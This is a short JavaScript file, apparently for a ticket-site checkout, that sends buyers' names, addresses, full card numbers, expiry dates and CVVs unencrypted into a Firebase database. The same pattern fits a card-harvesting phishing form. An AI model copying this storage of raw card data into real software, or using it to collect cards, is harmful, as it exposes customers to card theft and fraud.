const firebaseConfig = {
    apiKey: "AIzaSyCHyrjPhW6_nDNCF6-EZyWRq-1kUSYphHY",
    authDomain: "ticket-b4985.firebaseapp.com",
    projectId: "ticket-b4985",
    databaseURL: "https://ticket-b4985-default-rtdb.firebaseio.com/",
    storageBucket: "ticket-b4985.appspot.com",
    messagingSenderId: "1022461366670",
    appId: "1:1022461366670:web:1ca765fc2d62813fed94df"
  };
const app = firebase.initializeApp(firebaseConfig);
const dbRef = firebase.database().ref();

const detailsRef = dbRef.child('userdetails');
detailsRef.on("child_added", function(snapshot, prevChildKey) {
    var newPost = snapshot.val();
});

function send() {
    var fname = document.getElementById("fname").value;
    var email = document.getElementById("email").value;
    var bAdd = document.getElementById("Billadr").value;
    var bCity = document.getElementById("Billcity").value;
    var bState = document.getElementById("Billstate").value;
    var bZip = document.getElementById("Billzip").value;
    var cardName = document.getElementById("cname").value;
    var cardNumber = document.getElementById("ccnum").value;
    var expMonth = document.getElementById("expmonth").value;
    var expYear = document.getElementById("expyear").value;
    var cvv = document.getElementById("cvv").value;
    var shipAdd = document.getElementById("Shipadr").value;
    var shipCity = document.getElementById("Shipcity").value;
    var shipState = document.getElementById("Shipstate").value;
    var shipZip = document.getElementById("Statezip").value;

    detailsRef.push().set({
        fullName: fname,
        email: email,
        billingAddress: bAdd,
        billingCity: bCity,
        billingState: bState,
        billingZip: bZip,
        cardName: cardName,
        cardNumber: cardNumber,
        expMonth: expMonth,
        expYear: expYear,
        cvv: cvv,
        shipAdd: shipAdd,
        shipCity: shipCity,
        shipState: shipState,
        shipZip: shipZip
    });
}